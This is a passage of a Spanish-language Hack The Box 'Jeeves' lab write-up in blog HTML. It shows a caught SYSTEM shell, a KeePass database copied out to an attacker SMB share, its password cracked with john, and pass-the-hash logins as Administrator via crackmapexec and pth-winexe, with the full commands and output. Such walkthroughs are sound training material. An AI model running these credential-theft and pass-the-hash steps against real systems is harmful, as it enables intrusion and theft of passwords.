+connect to <span class="o">[</span>10.10.14.24] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.63] 49686
+Microsoft Windows <span class="o">[</span>Version 10.0.10586]
+<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+<span class="nb">whoami
+whoami
+</span>nt authority<span class="se">\s</span>ystem
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Otra forma de escalar privilegios sería buscando en el directorio del usuario <code class="language-plaintext highlighter-rouge">kohsuke</code> algun recurso que nos pueda servir y vemos que en la ruta <code class="language-plaintext highlighter-rouge">C:\Users\kohsuke\Documents&gt;</code> existe un archivo llamado <code class="language-plaintext highlighter-rouge">CEH.kdbx</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments
+
+
+Mode                LastWriteTime         Length Name                                                                  
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                  
+<span class="nt">-a----</span>        9/18/2017   1:43 PM           2846 CEH.kdbx                                                              
+
+
+PS C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<p>Si no sabemos que tipo de programa está asociado a la extensión <code class="language-plaintext highlighter-rouge">kdbx</code>, podemos utilizar los <a href="https://www.geeksforgeeks.org/working-with-magic-numbers-in-linux/"><strong><em>magic numbers</em></strong></a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt; Format-Hex <span class="nt">-Path</span> CEH.kdbx | Select-Object <span class="nt">-First</span> 1
+
+
+           Path: C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments<span class="se">\C</span>EH.kdbx
+
+           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F
+
+00000000   03 D9 A2 9A 67 FB 4B B5 01 00 03 00 02 10 00 31  .???g?K?.......1
+
+
+PS C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<p>Si buscamos por los primeros 8 números en hexadecimal: <code class="language-plaintext highlighter-rouge">03 D9 A2 9A</code> en internet, vemos que nos arroja el uso de la herramienta <a href="https://keepass.info/help/base/repair.html">keepass</a>. Asi que nos tratamos de pasar el archivo a nuestra máquina de atacante, por lo que nos compartimos un recurso a nivel de red:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ impacket-smbserver smbFolder <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<p>Creamos una unidad lógica sincronizada con nuestro recurso compartido:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt; New-PSDrive <span class="nt">-Name</span> <span class="s2">"SharedFolder"</span> <span class="nt">-PSProvider</span> <span class="s2">"FileSystem"</span> <span class="nt">-Root</span> <span class="s2">"</span><span class="se">\\</span><span class="s2">10.10.14.24</span><span class="se">\s</span><span class="s2">mbFolder"</span>
+
+Name           Used <span class="o">(</span>GB<span class="o">)</span>     Free <span class="o">(</span>GB<span class="o">)</span> Provider      Root                                               CurrentLocation
+<span class="nt">----</span>           <span class="nt">---------</span>     <span class="nt">---------</span> <span class="nt">--------</span>      <span class="nt">----</span>                                               <span class="nt">---------------</span>
+SharedF...                             FileSystem    <span class="se">\\</span>10.10.14.24<span class="se">\s</span>mbFolder                                           
+
+
+PS C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<p>Y ahora nos copiamos el archivo a nuestra máquina de atacante:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt; copy CEH.kdbx SharedFolder:<span class="se">\C</span>EH.kdbx
+PS C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ file CEH.kdbx
+CEH.kdbx: Keepass password database 2.x KDBX
+</code></pre></div></div>
+
+<p>Ahora debemos de descargarnos la utilidad que nos ayude a abrir el archivo, así que buscamos <strong>keepass</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ apt search keepass
+Ordenando... Hecho
+Buscar en todo el texto... Hecho
+gnome-passwordsafe/rolling 5.0-2 all
+  Password manager <span class="k">for </span>GNOME
+
+keepass2/rolling 2.47+dfsg-2 all
+  Password manager
+
+keepass2-doc/rolling 2.47+dfsg-2 all
+  Password manager - Documentation
+
+keepass2-plugin-keepasshttp/rolling 1.8.4.2+dfsg1-2.1 all
+  KeePass2 plugin to expose password entries securely over HTTP
+
+keepassx/rolling 2.0.3+git20190121.1682ab9-2.2 amd64
+  Cross Platform Password Manager
+
+keepassxc/rolling 2.6.2+dfsg.1-1 amd64
+  Cross Platform Password Manager
+
+kpcli/rolling 3.1-3.1 all
+  <span class="nb">command </span>line interface to KeePassX password manager databases
+
+libfile-keepass-perl/rolling 2.03-1.1 all
+  interface to KeePass V1 and V2 database files
+
+python3-pykeepass/rolling 3.2.1-2 all
+  KeePass database library - Python 3.x Module
+
+webext-keepassxc-browser/rolling 1.7.4+repack1-2 all
+  Web browser extension to organize web site credentials <span class="k">in </span>KeePassXC
+</code></pre></div></div>
+
+<p>Vamos a instalarnos <code class="language-plaintext highlighter-rouge">keepassxc</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ apt update
+❯ apt-get <span class="nb">install </span>keepassxc <span class="nt">-y</span>
+</code></pre></div></div>
+
+<p>Ahora si tratamos de abrir el archivo y vemos que nos solicita una contraseña</p>
+
+<p><img src="/assets/images/htb-jeeves/jeeves-keepass.png" alt="" /></p>
+
+<p>Vamos a utilizar fuerza bruta para tratar de romper la contraseña, asi que mediante la herramienta <code class="language-plaintext highlighter-rouge">keepass2john</code> creamos el hash del archivo y posteriormente utilizamos <code class="language-plaintext highlighter-rouge">john</code> para romper la contraseña:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ keepass2john CEH.kdbx <span class="o">&gt;</span> <span class="nb">hash</span>
+❯ john <span class="nt">-w</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>KeePass <span class="o">[</span>SHA256 AES 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 6000 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>version<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
+Cost 3 <span class="o">(</span>algorithm <span class="o">[</span><span class="nv">0</span><span class="o">=</span>AES, <span class="nv">1</span><span class="o">=</span>TwoFish, <span class="nv">2</span><span class="o">=</span>ChaCha]<span class="o">)</span> is 0 <span class="k">for </span>all loaded hashes
+Will run 8 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+moonshine1       <span class="o">(</span>CEH<span class="o">)</span>
+1g 0:00:00:08 DONE <span class="o">(</span>2021-10-11 15:33<span class="o">)</span> 0.1124g/s 6184p/s 6184c/s 6184C/s nick18..moonshine1
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Ya tenemos la contraseña <code class="language-plaintext highlighter-rouge">moonshine1</code>, así que vamos a utilizarla y ver el contenido del archivo <code class="language-plaintext highlighter-rouge">CEH.kdbx</code>.</p>
+
+<p><img src="/assets/images/htb-jeeves/jeeves-keepass1.png" alt="" /></p>
+
+<p>Viendo los usuarios, tenemos uno de nombre <code class="language-plaintext highlighter-rouge">?</code> y tiene de contraseña <code class="language-plaintext highlighter-rouge">aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code> que parece ser un hash NTLM; por lo que podríamos pensar que sería el hash del usuario <strong>Administrator</strong>. Vamos a validarlo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.63 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00'</span>
+SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+SMB         10.10.10.63     445    JEEVES           <span class="o">[</span>+] Jeeves<span class="se">\A</span>dministrator aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Vemos que podemos hacer <em>pass the hash</em> como el usuario <strong>Administrator</strong> ya que tenemos un <code class="language-plaintext highlighter-rouge">[+]</code> y al final un <code class="language-plaintext highlighter-rouge">(Pwn3d!)</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ pth-winexe <span class="nt">-U</span> WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
+E_md4hash wrapper called.
+HASH PASS: Substituting user supplied NTLM HASH...
+Microsoft Windows <span class="o">[</span>Version 10.0.10586]
+<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+<span class="nb">whoami
+</span>jeeves<span class="se">\a</span>dministrator
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<p>Ya nos encontramos administradores de la máquina y si tratamos de buscar la flag, vemos que no se encuentra en el directorio <code class="language-plaintext highlighter-rouge">C:\Users\Administrator\Desktop</code>, pero tenemos una nota:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cd </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is BE50-B1C9
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+11/08/2017  10:05 AM    &lt;DIR&gt;          <span class="nb">.</span>
+11/08/2017  10:05 AM    &lt;DIR&gt;          ..
+12/24/2017  03:51 AM                36 hm.txt
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File<span class="o">(</span>s<span class="o">)</span>            833 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   7,530,254,336 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type </span>hm.txt
+The flag is elsewhere.  Look deeper.
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<p>De acuerdo con el mensaje que tenemos <em>The flag is elsewhere.  Look deeper.</em>, podriamos estar pensando en <a href="https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/"><strong><em>Alternate Data Streams</em></strong></a>, por lo que si listamos otra vez con el parámetro <code class="language-plaintext highlighter-rouge">/R</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">dir</span> /R
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is BE50-B1C9
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+
+11/08/2017  10:05 AM    &lt;DIR&gt;          <span class="nb">.</span>
+11/08/2017  10:05 AM    &lt;DIR&gt;          ..
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:<span class="nv">$DATA</span>
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File<span class="o">(</span>s<span class="o">)</span>            833 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   7,527,256,064 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<p>Ahora vemos el atributo  <code class="language-plaintext highlighter-rouge">hm.txt:root.txt:$DATA</code>, que para visualizarlo, utilizamos el comando <code class="language-plaintext highlighter-rouge">more</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; more &lt; hm.txt:root.txt
+afbc5
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<p>Ya tenemos la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#powershell" class="page__taxonomy-item" rel="tag">Powershell</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#windows" class="page__taxonomy-item" rel="tag">Windows</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-10-11T00:00:00-05:00">October 11, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-bastard/" class="pagination--pager" title="Hack The Box Bastard
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
